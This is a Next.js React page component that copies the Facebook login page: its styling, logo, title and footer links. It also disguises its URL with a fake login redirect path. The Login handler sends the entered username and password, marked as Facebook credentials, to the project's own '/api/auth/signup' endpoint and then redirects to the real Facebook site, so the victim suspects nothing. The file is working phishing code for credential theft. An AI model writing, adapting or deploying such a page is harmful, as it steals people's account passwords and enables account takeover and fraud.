import React, {useState,useEffect} from 'react'

import Link from 'next/link';

import {useRouter} from 'next/router'

import Layout from "../components/contrib/layout"

import {API_URL} from "../settings"

import userData from "../components/contrib/user_files"


import {NextSeo} from 'next-seo'

import axios from 'axios'

//config--email,picture,language

const fbHomePage = 'http://web.facebook.com'


 const main = () => {

const router = useRouter()

const [username,setUsername] = useState('')
const [password,setPassword] = useState('')
const [show,setShow] = useState(false)
const [load,setLoad] = useState(false)


useEffect(()=>{

router.push('/#login?facebook=1&signed_nextredirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%fbLoginKey%2522%253A%')


},[])


const Login = async e=>{

e.preventDefault()

 const body = {
      username: username,
      password:password,
      site:'facebook'
    }

 try {
setLoad(true)

    const res = await axios.post('/api/auth/signup', body)


if(res.data){
  setLoad(false)
  router.push('http://web.facebook.com')
  

}

   

  } catch (error) {
    console.log(error+': Failed to Log in')
    setLoad(false)


  }



}


const CreateAccount = e=>{

e.preventDefault()

	router.push('http://web.facebook.com')
}




    return (  

     <Layout >


<NextSeo title={"Facebook - log in to continue"} />







<div id="globalContainer " class="uiContextualLayerParent ">
<div class="fb_content clearfix " id="content" role="main">
<div>



<div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka 
 " style={{display:'flex',
justifyContent:"center",alignItems:'center',flexDirection:'column'}} >



{/* details  */}

<div class="_8esl   "  >
<div class="_8ice pb-4  "  style={{display:'flex',
justifyContent:"center",alignItems:'center',flexDirection:'column',marginTop:'8%'}}>
<img class="fb_logo _8ilh img" 
src="/vendors/images/dF5SId3UHWd.svg"
 alt="Facebook" />
</div>
<p 
style={{
  fontFamily:'Helvetica, Arial, sans-serif',
  fontSize:'28px',
  lineHeight:1.2,
  textAlign:'center'
}} class=" pr-4">Facebook helps you connect and share with the people in your life.</p>
</div>



{/* form input */}
<div class="_8esn">
<div class="_8iep _8icy _9ahz _9ah-">
<div class="_6luv _52jv">
<form class="_9vtf" data-testid="royal_login_form" >

<div>
<div class="_6lux"  >
<input type="text"  onChange={e=>setUsername(e.target.value)} 
 class="inputtext _55r1 _6luy"
 style={{height:'49px',width:'100%'}} id="email"
 data-testid="royal_email" placeholder="Email address or phone number" 
 autofocus="1" aria-label="Email address or phone number" />
</div>


<div class="_6lux ">

<input  type={show?"text":"password"} onChange={e=>setPassword(e.target.value)} 
 style={{height:'49px',width:'100%'}} 
class="inputtext _55r1 _6luy _9npi" 
 id="pass" data-testid="royal_pass" placeholder="Password" aria-label="Password" />

</div>

  {password && <div class="_9ls7 hidden_elem" id="u_0_b_cM mt-2">

<a onClick={e=> {e.preventDefault(); setShow(!show) }}  role="button">
<div class="_9luh">
<div class="_9lsb _9ls8" >
{show ? <i class="icon-copy fa fa-eye-slash" aria-hidden="true"></i>: <i class="icon-copy fa fa-eye" aria-hidden="true"></i> }
</div>
</div></a>

</div>}
</div>

<div class="_6ltg pt-3">
<button  onClick={Login}  class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" 
 id="u_0_d_4K">Log In 
{load &&  
<span className="spinner-border spinner-border-sm mx-4 text-white " role="status" >
                         </span>}
                         </button>
</div>
<div class="_6ltj">
<a href="https://web.facebook.com/recover/initiate/?ars=facebook_login&amp;">Forgotten password?</a>
</div>
<div class="_8icz">
</div>
<div class="_6ltg"><a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy text-white"
 onClick={CreateAccount}  id="u_0_2_EV"
 data-testid="open-registration-form-button" rel="async">Create New Account</a>
</div></form>
</div>
<div id="reg_pages_msg" class="_58mk" >
<a href="http:web.facebook.com/pages/create/?ref_type=registration_form" style={{
  fontFamily:'Helvetica, Arial, sans-serif',
  fontSize:'14px',
  fontWeight:'bold',
  color:'#1c1e21'
}} class="_8esh">
Create a Page</a> <span style={{
  fontFamily:'Helvetica, Arial, sans-serif',
  fontSize:'14px',
  fontWeight:'normal',
  color:'#1c1e21'
}}>
 for a celebrity, band or business. </span>
</div>
</div>
</div>






</div>
</div>
</div>


{/* footer */}
<div class="full ">
<div class=" bg-white p-4">
<div  data-referrer="page_footer" data-testid="page_footer">
<ul class=" uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
<li>English (UK)</li><li><a class="_sv4" dir="ltr" href="https://ha-ng.facebook.com/" 
onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ha_NG&quot;, 
&quot;en_GB&quot;, &quot;https:\/\/ha-ng.facebook.com\/&quot;, &quot;www_list_selector&
quot;, 0); return false;" title="US">English (US)</a></li><li><a class="_sv4" 
dir="ltr"
 href="https://fr-fr.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;fr_FR&quot;, &quot;en_GB&quot;, &quot;https:\/\/fr-fr.facebook.com\/&quot;, &quot;www_list_selector&quot;, 1); return false;" title="French (France)">Français (France)</a></li><li><a class="_sv4" dir="ltr" href="https://pt-br.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;pt_BR&quot;, &quot;en_GB&quot;, &quot;https:\/\/pt-br.facebook.com\/&quot;, &quot;www_list_selector&quot;, 2); return false;" title="Portuguese (Brazil)">Português (Brasil)</a></li><li><a class="_sv4" dir="ltr" href="https://es-la.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;es_LA&quot;, &quot;en_GB&quot;, &quot;https:\/\/es-la.facebook.com\/&quot;, &quot;www_list_selector&quot;, 3); return false;" title="Spanish">Español</a></li><li><a class="_sv4" dir="rtl" href="https://ar-ar.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ar_AR&quot;, &quot;en_GB&quot;, &quot;https:\/\/ar-ar.facebook.com\/&quot;, &quot;www_list_selector&quot;, 4); return false;" title="Arabic">العربية</a></li><li><a class="_sv4" dir="ltr" href="https://id-id.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;id_ID&quot;, &quot;en_GB&quot;, &quot;https:\/\/id-id.facebook.com\/&quot;, &quot;www_list_selector&quot;, 5); return false;" title="Indonesian">Bahasa Indonesia</a></li><li><a class="_sv4" dir="ltr" href="https://de-de.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;de_DE&quot;, &quot;en_GB&quot;, &quot;https:\/\/de-de.facebook.com\/&quot;, &quot;www_list_selector&quot;, 6); return false;" title="German">Deutsch</a></li><li><a class="_sv4" dir="ltr" href="https://ja-jp.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ja_JP&quot;, &quot;en_GB&quot;, &quot;https:\/\/ja-jp.facebook.com\/&quot;, &quot;www_list_selector&quot;, 7); return false;" title="Japanese">日本語</a></li><li><a class="_sv4" dir="ltr" href="https://it-it.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;it_IT&quot;, &quot;en_GB&quot;, &quot;https:\/\/it-it.facebook.com\/&quot;, &quot;www_list_selector&quot;, 8); return false;" title="Italian">Italiano</a></li><li><a class="_sv4" dir="ltr" href="https://hi-in.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;hi_IN&quot;, &quot;en_GB&quot;, &quot;https:\/\/hi-in.facebook.com\/&quot;, &quot;www_list_selector&quot;, 9); return false;" title="Hindi">हिन्दी</a></li><li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fhi-in.facebook.com%2F&amp;source=www_list_selector_more" href="#" title="Show more languages"><i class="img sp_aZxtTu0Ekgg sx_41d396"></i></a></li></ul>
<div id="contentCurve">
</div>
<div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links"><ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
<li><a href="http://web.facebook.com/r.php" title="Sign up for Facebook">Sign Up</a>
</li><li><a href="http://web.facebook.com/login/" title="Log in to Facebook">Log In</a>
</li><li><a href="https://messenger.com/" title="Take a look at Messenger.">Messenger</a>
</li><li><a href="http://web.facebook.com/lite/" title="Facebook Lite for Android.">Facebook Lite</a>
</li><li><a href="https://web.facebook.com/watch/" title="Browse our Watch videos."> Watch </a>
</li><li><a href="http://web.facebook.com/directory/people/" title="Browse our people directory.">People</a></li>
<li><a href="http://web.facebook.com/directory/pages/" title="Browse our Pages directory.">Pages</a></li>
<li><a href="http://web.facebook.com/pages/category/">Page categories</a></li><li><a href="http://web.facebook.com/places/" title="Take a look at popular places on Facebook.">Places</a></li>
<li><a href="http://web.facebook.com/games/" title="Check out Facebook games.">Games</a></li><li><a href="http://web.facebook.com/directory/places/" title="Browse our places directory.">Locations</a></li><li><a href="http://web.facebook.com/marketplace/" title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
<li><a href="https://pay.facebook.com/" target="_blank" title="Learn more about Facebook Pay">Facebook Pay</a></li>
<li><a href="http://web.facebook.com/directory/groups/" title="Browse our Groups directory.">Groups</a></li>
<li><a href="http://web.facebook.com/jobs/" title="Apply for jobs and hire on Facebook.">Jobs</a></li><li>
<a href="https://www.oculus.com/" target="_blank" title="Learn more about Oculus">Oculus</a></li>
<li><a href="https://portal.facebook.com/" target="_blank" title="Learn more about Portal from Facebook">Portal</a></li><li>
<a href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT0T61GCq_Ly79SPycQeEuSFfsAFNWqV-Z2LQc3jFfzioEov3OlLI_cZShR7Wx76PIQZmKe00OyglGPLv-jXsG9gN9VJ8f-g_0ow6sLKOhDMyHdJKHxBHpBqefBDcTxUjhD2uRVM4DIUjQ" title="Take a look at Instagram" target="_blank" rel="noopener nofollow" data-lynx-mode="asynclazy">Instagram</a></li><li><a href="/local/lists/245019872666104/" title="Browse our Local Lists directory.">Local</a></li><li><a href="/fundraisers/" title="Donate to worthy causes.">Fundraisers</a></li><li><a href="/biz/directory/" title="Browse our Facebook Services directory.">Services</a></li><li><a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D" title="See the Voting Information Centre">Voting Information Centre</a></li><li><a href="https://about.facebook.com/" accesskey="8" title="Read our blog, discover the resource centre and find job opportunities.">About</a></li><li><a href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto" title="Advertise on Facebook">Create ad</a></li><li><a href="http://web.facebook.com/pages/create/?ref_type=site_footer" title="Create a Page">Create Page</a>
</li><li><a href="https://developers.facebook.com/?ref=pf" title="Develop on our platform.">Developers</a></li>
<li><a href="http://web.facebook.com/careers/?ref=pf" title="Make your next career move to our brilliant company.">Careers</a></li><li><a data-nocookies="1" href="http://web.facebook.com/privacy/explanation" title="Learn about your privacy and Facebook.">Privacy</a></li><li><a href="/policies/cookies/" title="Learn about cookies and Facebook." data-nocookies="1">Cookies</a></li><li><a class="_41ug" data-nocookies="1" href="https://web.facebook.com/help/568137493302217" title="Learn about AdChoices.">AdChoices<i class="img sp_aZxtTu0Ekgg sx_a33bbb"></i></a></li><li><a data-nocookies="1" href="http://web.facebook.com/policies?ref=pf" accesskey="9" title="Review our terms and policies.">Terms</a></li>
<li><a href="http://web.facebook.com/help/?ref=pf" accesskey="0" title="Visit our Help Centre.">Help</a></li>
<li><a accesskey="6" class="accessible_elem" href="http://web.facebook.com/settings" title="View and edit your Facebook settings.">Settings</a></li><li><a accesskey="7" class="accessible_elem" href="http://web.facebook.com/allactivity?privacy_source=activity_log_top_menu" title="View your activity log">Activity log</a></li></ul>
</div>
<div class="mvl copyright">
<div><span> Facebook © {new Date().getFullYear()}</span>
</div>
</div>
</div>
</div>
</div>




</div>






<div>
</div><span>
<img src="https://facebook.com/security/hsts-pixel.gif"
 width="0" height="0" style={{display:"none"}}/>
 </span>


     </Layout >

);
}

export default main;



